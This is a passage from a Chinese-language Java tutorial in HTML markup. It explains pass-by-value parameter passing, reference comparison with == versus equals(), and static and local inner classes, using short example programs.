class="language-bash">例1：class TestTransOfValue<span class="token punctuation">{</span>  public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    int val<span class="token punctuation">;</span>    StringBuffer sb1, sb2<span class="token punctuation">;</span>    val <span class="token operator">=</span> 10<span class="token punctuation">;</span>    sb1 <span class="token operator">=</span> new StringBuffer<span class="token punctuation">(</span><span class="token string">"apples"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sb2 <span class="token operator">=</span> new StringBuffer<span class="token punctuation">(</span><span class="token string">"pears"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"val is "</span> + val<span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"sb1 is "</span> + sb1<span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"sb2 is "</span> + sb2<span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System.out.println<span class="token punctuation">(</span><span class="token string">"calling modify"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //按值传递所有参数    modify<span class="token punctuation">(</span>val, sb1, sb2<span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"returned from modify"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"val is "</span> + val<span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"sb1 is "</span> + sb1<span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"sb2 is "</span> + sb2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>public static void modify<span class="token punctuation">(</span>int a, StringBuffer r1,                         StringBuffer r2<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"in modify..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //在方法中修改基本类型变量的值    a <span class="token operator">=</span> 0<span class="token punctuation">;</span>      //在方法中修改对象引用值的副本    r1 <span class="token operator">=</span> null<span class="token punctuation">;</span>  //1    //在方法中修改副本的对象实体值    r2.append<span class="token punctuation">(</span><span class="token string">" taste good"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"a is "</span> + a<span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"r1 is "</span> + r1<span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"r2 is "</span> + r2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>运行后输出：val is 10sb1 is applessb2 is pearscalling modify <span class="token keyword">in</span> modify<span class="token punctuation">..</span>.a is 0r1 is nullr2 is pears taste good returned from modifyval is 10sb1 is applessb2 is pears taste good /*关于这里的sb1和r1：当参数传到modify后，r1和sb1指向同一个地址，若改变了r1指向的地址，并不会更改sb1指向的地址。这个时候就相当于看作两个指针了。关于sb2和r2：sb2和r2指向同一个地址，这个地址指向的值<span class="token punctuation">(</span>实体值<span class="token punctuation">)</span>被改变了，则结束后sb2和r2的实体值也就相应的改变了。*/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-img"><p><img src="https://i.loli.net/2018/12/28/5c2500f374fbd.png" alt="FX.png" data-zoomable></p></div><pre class="line-numbers language-bash"><code class="language-bash">例2：class Swap<span class="token punctuation">{</span>  public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    Integer a, b<span class="token punctuation">;</span>    a <span class="token operator">=</span> new Integer<span class="token punctuation">(</span>10<span class="token punctuation">)</span><span class="token punctuation">;</span>    b <span class="token operator">=</span> new Integer<span class="token punctuation">(</span>50<span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"before swap..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"a is "</span> + a<span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"b is "</span> + b<span class="token punctuation">)</span><span class="token punctuation">;</span>    swap<span class="token punctuation">(</span>a, b<span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"after swap..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"a is "</span> + a<span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"b is "</span> + b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> public static void swap<span class="token punctuation">(</span>Integer a, Integer b<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    Integer temp <span class="token operator">=</span> a<span class="token punctuation">;</span>    a <span class="token operator">=</span> b<span class="token punctuation">;</span>    b <span class="token operator">=</span> temp<span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"in swap..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"a is "</span> + a<span class="token punctuation">)</span><span class="token punctuation">;</span>    System.out.println<span class="token punctuation">(</span><span class="token string">"b is "</span> + b<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>/*运行后输出：before swap<span class="token punctuation">..</span>.a is 10b is 50<span class="token keyword">in</span> swap…a is 50b is 10after swap<span class="token punctuation">..</span>.a is 10b is 50 */<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**参数传递总结：**</font> (1) Java按值传递所有参数,制作所有参数的副本,而不管它们的类型 (2) 对于基本类型的变量形参修改了并不能反映到函数外面的实参 (3) 对于引用类型的变量，在形参中修改了对象实体值可以反映到实参，在形参中修改了对象引用值，     不能反映到实参</font></td></tr></table></div></div><p>&emsp;<br>&emsp;</p><h4 id="1-4-引用型变量的实体值、引用值比较"><font color="#20B2AA" face="Comic sans MS">1.4  引用型变量的实体值、引用值比较</font><a href="post/Java-Variable-InnerClass6#1-4-引用型变量的实体值、引用值比较"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 📒参数传递总结：</strong></font><br> (1) 比较基本类型的数据: ==和!=<br> (2) 如果要比较引用型变量是否相同,可以直接用==和!=吗?<font color="red">  <strong>答：不能</strong></font></font></p><p><strong>==和!=用来比较引用型变量时（只能比较引用值（地址）是不是相等）,只能判断运算符两边引用的是不是同一个对象,即对象的地址值（或对象引用值）！！！！！</strong><br><font color="#00B2EE"><strong>如何比较两个对象的内容(对象实体值)是否相同?<br>用equls()方法：</strong></font><br></p><div class="article-bounded"><div class="article-table"><table><tr><td bgcolor="#ADD8E6"><font face="Comic sans MS"><font color="red">**2. 📒引用型变量比较总结：**</font> (1) 比较两个变量是否同一个对象（即对象引用值是否相同），用==和!= (2) 比较两个变量的内容是否相同用equals方法 (3) **自己定义的类如果要支持equals方法必须重写从Object类继承来的equals方法(比如前面的String类 是java自己的类就不需要重写equals，但是Employee类就是自己定义的类则需要重写equals)**<p><strong>Object类中的equals方法：</strong><br> <em>public boolean equals(Object obj){<br>   return (this==obj);<br> }</em><br></p></font></td></tr></table></div></div><p></p><pre class="line-numbers language-bash"><code class="language-bash">equals示例1:class EqualsTest<span class="token punctuation">{</span>  public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> arguments<span class="token punctuation">)</span>  <span class="token punctuation">{</span>     String str1,str2<span class="token punctuation">;</span>     str1<span class="token operator">=</span><span class="token string">"Free the bound periodicals."</span><span class="token punctuation">;</span>     str2<span class="token operator">=</span>str1<span class="token punctuation">;</span>     System.out.println<span class="token punctuation">(</span><span class="token string">"String1: "</span>+str1<span class="token punctuation">)</span><span class="token punctuation">;</span>     System.out.println<span class="token punctuation">(</span><span class="token string">"String2: "</span>+str2<span class="token punctuation">)</span><span class="token punctuation">;</span>     System.out.println<span class="token punctuation">(</span><span class="token string">"Same object? "</span>+<span class="token punctuation">(</span>str1<span class="token operator">==</span>str2<span class="token punctuation">))</span><span class="token punctuation">;</span>      //true     str2<span class="token operator">=</span>new String<span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">;</span>     System.out.println<span class="token punctuation">(</span><span class="token string">"String1: "</span>+str1<span class="token punctuation">)</span><span class="token punctuation">;</span>     System.out.println<span class="token punctuation">(</span><span class="token string">"String2: "</span>+str2<span class="token punctuation">)</span><span class="token punctuation">;</span>     System.out.println<span class="token punctuation">(</span><span class="token string">"Same object? "</span>+<span class="token punctuation">(</span>str1<span class="token operator">==</span>str2<span class="token punctuation">))</span><span class="token punctuation">;</span>      //false     System.out.println<span class="token punctuation">(</span><span class="token string">"Same value? "</span>+str1.equals<span class="token punctuation">(</span>str2<span class="token punctuation">))</span><span class="token punctuation">;</span>  //true     String str3,str4<span class="token punctuation">;</span>     str3<span class="token operator">=</span><span class="token string">"busy"</span><span class="token punctuation">;</span>     str4<span class="token operator">=</span><span class="token string">"busy"</span><span class="token punctuation">;</span> //str4<span class="token operator">=</span>new String<span class="token punctuation">(</span><span class="token string">"busy"</span><span class="token punctuation">)</span>或str4<span class="token operator">=</span>new String<span class="token punctuation">(</span>str3<span class="token punctuation">)</span>      System.out.println<span class="token punctuation">(</span><span class="token string">"String3: "</span>+str3<span class="token punctuation">)</span><span class="token punctuation">;</span>     System.out.println<span class="token punctuation">(</span><span class="token string">"String4: "</span>+str4<span class="token punctuation">)</span><span class="token punctuation">;</span>     System.out.println<span class="token punctuation">(</span><span class="token string">"Same object? "</span>+<span class="token punctuation">(</span>str3<span class="token operator">==</span>str4<span class="token punctuation">))</span><span class="token punctuation">;</span>       //true     System.out.println<span class="token punctuation">(</span><span class="token string">"Same value? "</span>+str3.equals<span class="token punctuation">(</span>str4<span class="token punctuation">))</span><span class="token punctuation">;</span>   //true      String str5,str6<span class="token punctuation">;</span>     str5<span class="token operator">=</span><span class="token string">"str5busy"</span><span class="token punctuation">;</span>     str6<span class="token operator">=</span><span class="token string">"str6busy"</span><span class="token punctuation">;</span>     System.out.println<span class="token punctuation">(</span><span class="token string">"String5: "</span>+str5<span class="token punctuation">)</span><span class="token punctuation">;</span>     System.out.println<span class="token punctuation">(</span><span class="token string">"String6: "</span>+str6<span class="token punctuation">)</span><span class="token punctuation">;</span>     System.out.println<span class="token punctuation">(</span><span class="token string">"Same object? "</span>+<span class="token punctuation">(</span>str5<span class="token operator">==</span>str6<span class="token punctuation">))</span><span class="token punctuation">;</span>      //false     System.out.println<span class="token punctuation">(</span><span class="token string">"Same value? "</span>+str5.equals<span class="token punctuation">(</span>str6<span class="token punctuation">))</span><span class="token punctuation">;</span>  //false        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">equals示例2：<span class="token function">import</span> java.util.*<span class="token punctuation">;</span>public class EqualsTest <span class="token punctuation">{</span>     public EqualsTest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>         public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>     Employee alice1<span class="token operator">=</span>new Employee<span class="token punctuation">(</span><span class="token string">"Alice"</span>,75000,1987,12,15<span class="token punctuation">)</span><span class="token punctuation">;</span>     Employee alice2<span class="token operator">=</span>alice1<span class="token punctuation">;</span>     Employee alice3<span class="token operator">=</span>new Employee<span class="token punctuation">(</span><span class="token string">"Alice"</span>,75000,1987,12,15<span class="token punctuation">)</span><span class="token punctuation">;</span>     Employee bob<span class="token operator">=</span>new Employee<span class="token punctuation">(</span><span class="token string">"Bob"</span>,50000,1989,10,1<span class="token punctuation">)</span><span class="token punctuation">;</span>     System.out.println<span class="token punctuation">(</span><span class="token string">"alice1==alice2: "</span>+<span class="token punctuation">(</span>alice1<span class="token operator">==</span>alice2<span class="token punctuation">))</span><span class="token punctuation">;</span>    //true     System.out.println<span class="token punctuation">(</span><span class="token string">"alice1==alice3: "</span>+<span class="token punctuation">(</span>alice1<span class="token operator">==</span>alice3<span class="token punctuation">))</span><span class="token punctuation">;</span>    //false      System.out.println<span class="token punctuation">(</span><span class="token string">"alice1.equals(alice3): "</span>+alice1.equals<span class="token punctuation">(</span>alice3<span class="token punctuation">))</span><span class="token punctuation">;</span>  //true     System.out.println<span class="token punctuation">(</span><span class="token string">"alice1.equals(bob): "</span>+alice1.equals<span class="token punctuation">(</span>bob<span class="token punctuation">))</span><span class="token punctuation">;</span>   //false      System.out.println<span class="token punctuation">(</span><span class="token string">"bob.toString(): "</span>+bob<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>class Employee<span class="token punctuation">{</span>    private String name<span class="token punctuation">;</span>    private double salary<span class="token punctuation">;</span>    private Date hireDay<span class="token punctuation">;</span>     public Employee<span class="token punctuation">(</span>String n,double s,int year,int month,int day<span class="token punctuation">)</span><span class="token punctuation">{</span>            name<span class="token operator">=</span>n<span class="token punctuation">;</span>            salary<span class="token operator">=</span>s        hireDay<span class="token operator">=</span>new Date<span class="token punctuation">(</span>year,month,day<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    public String getName<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">return</span> name<span class="token punctuation">;</span>     <span class="token punctuation">}</span>    public double getSalary<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">return</span> salary<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    public Date getHireDay<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">return</span> hireDay<span class="token punctuation">;</span> <span class="token punctuation">}</span>    public void raiseSalary<span class="token punctuation">(</span>double byPercent<span class="token punctuation">)</span><span class="token punctuation">{</span>            double raise<span class="token operator">=</span>salary*byPercent/100<span class="token punctuation">;</span>            salary+<span class="token operator">=</span>raise<span class="token punctuation">;</span> <span class="token punctuation">}</span>public boolean equals<span class="token punctuation">(</span>Object otherObject<span class="token punctuation">)</span><span class="token punctuation">{</span>     //子类覆盖了Object的equals方法  if<span class="token punctuation">(</span>this<span class="token operator">==</span>otherObject<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  if<span class="token punctuation">(</span>otherObject<span class="token operator">==</span>null<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  if<span class="token punctuation">(</span>getClass<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">!=</span>otherObject.getClass<span class="token punctuation">(</span><span class="token punctuation">))</span>  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  Employee other<span class="token operator">=</span><span class="token punctuation">(</span>Employee<span class="token punctuation">)</span>otherObject<span class="token punctuation">;</span>  <span class="token keyword">return</span> name.equals<span class="token punctuation">(</span>other.name<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span>              salary<span class="token operator">==</span>other.salary<span class="token operator">&amp;&amp;</span>hireDay.equals<span class="token punctuation">(</span>other.hireDay<span class="token punctuation">)</span><span class="token punctuation">;</span>                         //子类覆盖了Object的toString方法 <span class="token punctuation">}</span> public String toString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> getClass<span class="token punctuation">(</span><span class="token punctuation">)</span>.getName<span class="token punctuation">(</span><span class="token punctuation">)</span>+           <span class="token string">"[name="</span>+name+<span class="token string">",salary="</span>+salary+<span class="token string">",hireDay="</span>+hireDay+<span class="token string">"]"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> private String name<span class="token punctuation">;</span> private double salary<span class="token punctuation">;</span> private Date hireDay<span class="token punctuation">;</span><span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="二、-内部类"><font color="#FF6347" face="Comic sans MS">二、 内部类</font><a href="post/Java-Variable-InnerClass6#二、-内部类"></a></h3><h4 id="2-1-内部类的定义与使用"><font color="#20B2AA" face="Comic sans MS">2.1  内部类的定义与使用</font><a href="post/Java-Variable-InnerClass6#2-1-内部类的定义与使用"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 📒内部类的定义：</strong></font>将类的定义置入一个用于封装它的类（外部类）里。<br>    <font color="#00B2EE"><strong>注意：</strong></font><br>    内部类不能与外部类同名（否则，编译器无法区分内部类与外部类），如果内部类还有内部类，内部类的内部类不能与它的任何一层外部类同名。<br>    <font color="#00B2EE"><strong>作用：</strong></font><br>    逻辑分组, 隐藏细节<br></font></p><pre class="line-numbers language-bash"><code class="language-bash">/*内部类结合多态可以很方便的隐藏类的细节<span class="token punctuation">(</span>包括类名<span class="token punctuation">)</span>*/interface Contents<span class="token punctuation">{</span>  int value<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>interface Destination <span class="token punctuation">{</span>  String readLabel<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>class Goods<span class="token punctuation">{</span>    private class Content implements Contents<span class="token punctuation">{</span>  //<span class="token string">"private class Contentimplements Contents"</span>         private int i<span class="token operator">=</span>11<span class="token punctuation">;</span>        public int value<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> i<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>    protected class GDestination    //<span class="token string">"protected class GDestination implements Destination"</span>    implements Destination<span class="token punctuation">{</span>      private String label<span class="token punctuation">;</span>  private GDestination<span class="token punctuation">(</span>String whereTo<span class="token punctuation">)</span><span class="token punctuation">{</span>    label<span class="token operator">=</span>whereTo<span class="token punctuation">;</span>  <span class="token punctuation">}</span>public String readLabel<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> label<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>public Contents cont<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> new Content<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>public Destination dest<span class="token punctuation">(</span>String s<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> new GDestination<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token punctuation">}</span>public class TestGoods <span class="token punctuation">{</span>   //<span class="token string">"public class TestGoods"</span>    public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>         Goods g<span class="token operator">=</span>new Goods<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         Contents c<span class="token operator">=</span>g.cont<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         Destination d<span class="token operator">=</span>g.dest<span class="token punctuation">(</span><span class="token string">"Beijing"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><font face="Comic sans MS"><font color="red"><strong>2. 📒内部类对象的创建：</strong></font>创建非静态内部类的对象时一定要确保已经有一个外部类对象。<br>(1) 利用外部类的方法创建并返回，因为方法是由外部类对象调用的，那创建该内部类对象时，一定已经拥有了所属的外部类对象了<br>public Contents cont(){  &emsp;&emsp;&emsp;&emsp;       Goods g=new Goods();<br>  return new Content();  &emsp;&emsp;&emsp;&emsp;&ensp;        Contents c=g.cont();<br>}</font></p><p>(2) 创建内部类还可以在除外部类中的其它类中，但是要确保该类具有访问内部类的权限，并且已经创建了一个外部类对象。格式如下：<br></p><pre class="line-numbers language-bash"><code class="language-bash">outerObject<span class="token operator">=</span>new outerClass<span class="token punctuation">(</span>Constructor Parameters<span class="token punctuation">)</span><span class="token punctuation">;</span>outerClass.innerClass innerObject <span class="token operator">=</span> outerObject.new InnerClass<span class="token punctuation">(</span>Constructor Parameters<span class="token punctuation">)</span><span class="token punctuation">;</span> Goods g1<span class="token operator">=</span>new Goods<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> Goods.Content c1<span class="token operator">=</span>g.new Content<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> OR Goods g1<span class="token operator">=</span>new Goods<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> Goods.GDestination d1<span class="token operator">=</span>g1.new GDestionation<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>3. 📒内部类的修饰符：</strong></font><br>（1）<font color="red"><strong>public、protected、private和缺省：</strong></font>访问权限修饰符，用来限定内部类的访问权限，<br>  &emsp;&emsp;一般的外部类是不能用protected和private修饰的。访问权限修饰符的限定和成员变量的限定一样。<br>（2）<font color="red"><strong>final:</strong></font>表明内部类不能继承。<br>（3）<font color="red"><strong>abstract：</strong></font>抽象内部类，不能被实例化。<br>（4）<font color="red"><strong>static：</strong></font>表明一个静态内部类。</font></p><p><font face="Comic sans MS"><font color="red"><strong>4. 📒静态内部类：</strong></font><br><strong>和普通的非静态内部类有较大的不同，使用时要遵循如下原则：</strong><br>（1）实例化static内部类时，在new前面不需要用对象变量；<br><font color="red"><strong>（2）static内部类中不能访问其外部类的非static属性及方法，即只能访问static成员；<br>（3）static方法中不能访问非static的属性及方法，也不能不带前缀地new一个非static的内部类。</strong></font><br></font></p><pre class="line-numbers language-bash"><code class="language-bash">class A<span class="token punctuation">{</span>      private int x<span class="token punctuation">;</span>      void m<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  new B<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     static void sm<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      //在外部类的静态方法中     //不能直接创建内部类对象     //new B<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//<span class="token operator">!</span><span class="token operator">!</span>error    <span class="token punctuation">}</span>class B<span class="token punctuation">{</span>      B<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>x<span class="token operator">=</span>5<span class="token punctuation">;</span><span class="token punctuation">}</span>  <span class="token punctuation">}</span>//B类结束<span class="token punctuation">}</span>//A类结束class Outer<span class="token punctuation">{</span>  static class Inner  <span class="token punctuation">{</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>class TestInnerStatic<span class="token punctuation">{</span>  public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>    <span class="token punctuation">{</span>    //创建非静态内部类B的对象a_b和ab    A.B a_b<span class="token operator">=</span>new A<span class="token punctuation">(</span><span class="token punctuation">)</span>.new B<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    A a<span class="token operator">=</span>new A<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    A.B ab<span class="token operator">=</span>a.new B<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //创建静态内部类Inner的对象oi，不需要外部类Outer的对象    Outer.Inner oi<span class="token operator">=</span>new Outer.Inner<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    //Outer.Inner oi2<span class="token operator">=</span>Outer.new Inner<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//<span class="token operator">!</span><span class="token operator">!</span>error    //Outer.Inner oi3<span class="token operator">=</span>new Outer<span class="token punctuation">(</span><span class="token punctuation">)</span>.new Inner<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>//<span class="token operator">!</span><span class="token operator">!</span>error  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>5. 📒内部类中访问外部类的成员：</strong></font><br>(1) 内部类中是可以直接访问外部类的其他属性与方法的，即使它们是private的。<br>(2) 如果内部类中有与外部类同名的属性与方法，可以使用下面的格式来表达外部类的引用，从而区分外部类和内部类的同名的属性与方法：<br>                       outerClass.this<br></font> </p><p>&emsp;<br>&emsp;</p><h4 id="2-2-方法和作用域中的内部类"><font color="#20B2AA" face="Comic sans MS">2.2  方法和作用域中的内部类</font><a href="post/Java-Variable-InnerClass6#2-2-方法和作用域中的内部类"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>内部类也可以是局部的，它可以定义在一个方法甚至一个代码块之内。</strong></font><br>(1) 内部类中是可以直接访问外部类的其他属性与方法的，即使它们是private的。<br>(2) 如果内部类中有与外部类同名的属性与方法，可以使用下面的格式来表达外部类的引用，从而区分外部类和内部类的同名的属性与方法：<br>                       outerClass.this<br></font> </p><pre class="line-numbers language-bash"><code class="language-bash">例1: 方法中的内部类:interface Destination <span class="token punctuation">{</span>  String readLabel<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>public class Goods2 <span class="token punctuation">{</span>  String a<span class="token operator">=</span><span class="token string">"Goods2"</span><span class="token punctuation">;</span>     public Destination dest<span class="token punctuation">(</span>String s<span class="token punctuation">)</span> <span class="token punctuation">{</span>          class GDestination implements Destination <span class="token punctuation">{</span>            private String label<span class="token punctuation">;</span>            private GDestination<span class="token punctuation">(</span>String whereTo<span class="token punctuation">)</span> <span class="token punctuation">{</span>             label <span class="token operator">=</span> whereTo<span class="token punctuation">;</span>             System.out.println<span class="token punctuation">(</span><span class="token string">"access outer class:"</span>+a<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span>               public String readLabel<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> label<span class="token punctuation">;</span> <span class="token punctuation">}</span>          <span class="token punctuation">}</span>          <span class="token keyword">return</span> new GDestination<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>          Goods2 g<span class="token operator">=</span> new Goods2<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          Destination d <span class="token operator">=</span> g.dest<span class="token punctuation">(</span><span class="token string">"Beijing"</span><span class="token 